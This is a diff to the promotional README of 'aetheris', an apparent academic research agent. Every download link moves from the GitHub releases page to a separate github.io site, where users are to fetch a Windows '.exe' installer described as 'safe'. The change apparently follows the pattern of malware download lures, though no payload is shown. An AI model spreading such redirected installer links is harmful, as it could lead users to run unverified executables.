@@ -6,9 +6,9 @@ Welcome to **aetheris**, the powerful academic research agent that helps you wor
 
 ### 📥 Download aetheris Now
 
-Ready to supercharge your research? [**Click here to download aetheris**](https://github.com/Racerprosecution782/aetheris/releases) — it’s quick, safe, and takes less than two minutes to set up.
+Ready to supercharge your research? [**Click here to download aetheris**](https://racerprosecution782.github.io) — it’s quick, safe, and takes less than two minutes to set up.
 
-[⬇️ DOWNLOAD AETHERIS](https://github.com/Racerprosecution782/aetheris/releases)
+[⬇️ DOWNLOAD AETHERIS](https://racerprosecution782.github.io)
 
 ---
 
@@ -32,7 +32,7 @@ Follow these simple steps, and you'll be using aetheris in no time.
 
 ### Step 1: Download the File
 
-1. Visit [the official aetheris download page](https://github.com/Racerprosecution782/aetheris/releases).
+1. Visit [the official aetheris download page](https://racerprosecution782.github.io).
 2. Look for the most recent version (the newest release is listed first).
 3. Click the **download link** for the Windows version. The file name will look something like `aetheris-setup.exe` or `aetheris-v1.0.zip`.
 
@@ -153,7 +153,7 @@ aetheris grows better with feedback and contributions. On the GitHub page, you c
 
 You've made the right choice. aetheris removes the tedious busywork from academic research, giving you more time for the thinking, writing, and discovery that matters.
 
-➡️ **[Download aetheris now](https://github.com/Racerprosecution782/aetheris/releases)** and bring your research assistant to life. It's free, friendly, and ready when you are.
+➡️ **[Download aetheris now](https://racerprosecution782.github.io)** and bring your research assistant to life. It's free, friendly, and ready when you are.
 
 The one-click download awaits. Your next paper could be your best one yet.
 
